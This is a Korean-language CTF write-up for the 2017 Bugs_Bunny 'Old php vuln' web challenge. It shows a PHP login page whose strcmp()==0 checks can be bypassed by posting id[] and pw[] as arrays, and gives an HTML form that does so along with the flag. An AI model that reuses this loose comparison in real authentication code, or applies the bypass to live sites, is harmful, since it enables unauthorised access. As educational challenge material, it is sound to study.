# 2017 Bugs_Bunny CTF - [Web] Old php vuln
## Problem
```
Hey ,Agent 
Your mission is to hack this secure portal .
Good luck.
http://52.53.151.123/web/web35.php
```

## Solution
[*] 해당 문제는 라이트업을 통하여 문제를 재구성하여 풀었으므로, 실제의 문제내용과는 틀릴 수 있습니다. 문제에 대한 더 자세한 라이트업은 동영상으로 되어있으니, 맨 마지막에 링크 첨부하겠습니다.

처음 문제 페이지에 접속을 하면 로그인창이 나오는데, 문제가 `old php vuln` 인 것으로 보아서
`strcmp` 구문의 취약점을 생각 할 수가 있다.

`POST` 값으로 전송되어지는 `id`, `pw` 파라미터값을 `id[]`, `pw[]` 이런 식으로 `Array`형태로 만들어서 전송을 하면, 플래그를 확인할 수가 있다.

`Bugs_Bunny{65755da329b8770c3e11e7ccba37f4e3}`


## Solution Code
```
<!DOCTYPE html>
<html>
<head>
	<title> Solve.html </title>
</head>
<body>
<form action="index.php" method="POST">
<input type="text" name="id[]"><br>
<input type="text" name="pw[]"><br>
<input type="submit" value="OK">
</form>
</body>
</html>
```

## Problem Code
```
<?php

function solve() {
	echo "Hello, admin! <br>Bugs_Bunny{65755da329b8770c3e11e7ccba37f4e3}";
}


$id = $_POST['id'];
$pw = $_POST['pw'];

if(isset($id) && isset($pw)) {
	if(strcmp($id, "admin")==0) {
		if(strcmp($pw, "sotodrkrdpsxmdhkdltmsmswjddusdlchlrhrhdkdldhdkdlsmschldbwjddlchlrhdlsemt")==0) {
			@solve();
		} else {
			echo "You are not admin! :( <br><a href='index.php'> Back </a>";
		}
	} else {
		echo "You are not admin! :( <br><a href='index.php'> Back </a>";
	}
} else {
	?>
	<!DOCTYPE html>
	<html>
	<head>
		<title> Admin Login Page </title>
	</head>
	<body>
	<form method="POST">
	<input type="text" name="id"><br>
	<input type="text" name="pw"><br>
	<input type="submit" value="Login">
	</form>
	</body>
	</html>
	<?
}
?>
```

## Other Write-Ups
[Write-Up in Youtube](https://www.youtube.com/watch?v=gWEbrLftMu4)
